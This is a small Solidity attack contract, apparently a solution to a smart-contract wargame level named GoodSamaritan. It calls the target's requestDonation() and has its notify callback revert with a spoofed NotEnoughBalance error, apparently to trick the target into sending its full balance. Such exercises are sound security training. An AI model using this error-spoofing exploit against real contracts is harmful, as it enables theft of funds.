pragma solidity ^0.8.0;

contract GoodSamaritanAttack {

    error NotEnoughBalance();
    address goodSamaritan;

    constructor(address gs) {
        goodSamaritan = gs;
    }

    function attack() public {
        goodSamaritan.call(abi.encodeWithSignature('requestDonation()'));
    }

    function notify(uint256 amount) external {
        amount;
        if (amount == 10) revert NotEnoughBalance();
    }
}
